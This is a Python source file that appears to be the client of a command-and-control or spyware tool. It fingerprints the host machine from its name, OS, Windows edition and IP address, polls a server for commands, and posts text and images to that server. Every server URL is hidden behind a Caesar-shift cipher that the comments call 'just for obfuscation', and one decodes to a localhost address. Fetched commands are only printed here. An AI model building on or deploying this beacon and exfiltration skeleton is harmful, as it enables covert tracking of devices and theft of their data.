import platform
import socket
import hashlib
import requests

DEVICE_ID = ""

def fetch_commands():
    r = requests.get(url=decypher("tffb://xaomxtaef:2424/oype", 68260 + 314), params={"fp": DEVICE_ID})
    res = r.json()

    if not res["ok"]:
        return

    if len(res["cmds"]) == 0:
        return

    for x in res["cmds"]:
        print(x)


def send_text(desc):
    requests.post(url=decypher("vhhd://zcqozvcgh:0202/roho/hslh", 915812), json={"ok": True, "fp": DEVICE_ID, "desc": desc})


def send_img(img):
    requests.post(url=decypher("kwws://orfdokrvw:1313/gdwd/slfwxuh",2142143), json={"ok": True, "fp": DEVICE_ID, "img": img})


def create_fp():
    global DEVICE_ID

    pt = (platform.node() + 
        platform.version() + 
        platform.machine() + 
        platform.win32_edition() +
        socket.gethostbyname(socket.gethostname())
    ).encode()

    DEVICE_ID = hashlib.sha256(pt).hexdigest()[-6:]


# Just for obfuscation
def cypher(t, k):
    y = ""
    for c in t:
        if c.isupper(): 
            ci = ord(c) - ord('A')
            cs = (ci + k) % 26 + ord('A')
            cn = chr(cs)
            y += cn
        elif c.islower():
            ci = ord(c) - ord('a') 
            cs = (ci + k) % 26 + ord('a')
            cn = chr(cs)
            y += cn
        elif c.isdigit():
            cn = (int(c) + k) % 10
            y += str(cn)
        else:
            y += c
    return y


# Just for obfuscation
def decypher(t, k):
    y = ""
    for c in t:
        if c.isupper(): 
            ci = ord(c) - ord('A')
            cp = (ci - k) % 26 + ord('A')
            cg = chr(cp)
            y += cg
        elif c.islower(): 
            ci = ord(c) - ord('a') 
            cp = (ci - k) % 26 + ord('a')
            cg = chr(cp)
            y += cg
        elif c.isdigit():
            cg = (int(c) - k) % 10
            y += str(cg)
        else:
            y += c
    return y